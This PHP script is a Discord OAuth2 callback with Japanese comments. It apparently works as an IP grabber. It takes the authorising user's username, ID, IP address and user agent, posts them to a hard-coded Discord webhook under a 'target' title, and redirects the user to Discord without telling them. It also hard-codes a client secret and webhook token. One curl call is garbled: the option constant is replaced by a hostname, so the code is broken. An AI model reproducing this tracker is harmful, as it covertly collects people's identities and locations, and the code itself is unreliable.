<?php
// --- 最終設定データ ---
$client_id     = '1483731872050839564';
$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';

// 重要：新しいRailwayのURL（grateful-wholeness...）に書き換えています
$redirect_uri  = 'https://grateful-wholeness-production.up.railway.app'; 

// 待機画面
if (!isset($_GET['code'])) {
    echo "Ready. Please use the OAuth2 link.";
    exit;
}

// 1. アクセストークンの取得
$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_raw = curl_exec($ch);
$token_res = json_decode($token_raw, true);

// エラーチェック
if (!isset($token_res['access_token'])) {
    echo "<h3>Access Token Error</h3>";
    echo "Response: " . htmlspecialchars($token_raw);
    exit;
}

// 2. ユーザー情報の取得
$ch = curl_init('https://discord.com/api/users/@me');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $token_res['access_token']]);
$user = json_decode(curl_exec($ch), true);

// 3. IPアドレスとデバイス情報の取得
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// 4. Discord Webhookへ送信
$payload = json_encode([
    "embeds" => [[
        "title" => "🎯 認証成功 (Railway最終版)",
        "color" => 5814783,
        "fields" => [
            ["name" => "👤 ユーザー名", "value" => $user['username'], "inline" => true],
            ["name" => "🆔 User ID", "value" => $user['id'], "inline" => true],
            ["name" => "🌐 IPアドレス", "value" => $ip, "inline" => false],
            ["name" => "📱 ブラウザ/デバイス", "value" => "```" . $ua . "```", "inline" => false]
        ],
        "timestamp" => date("c")
    ]]
]);

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, grateful-wholeness-production.up.railway.app, $payload);
curl_exec($ch);

// 5. 完了後にDiscordへリダイレクト
header("Location: https://discord.com/channels/@me");
exit;
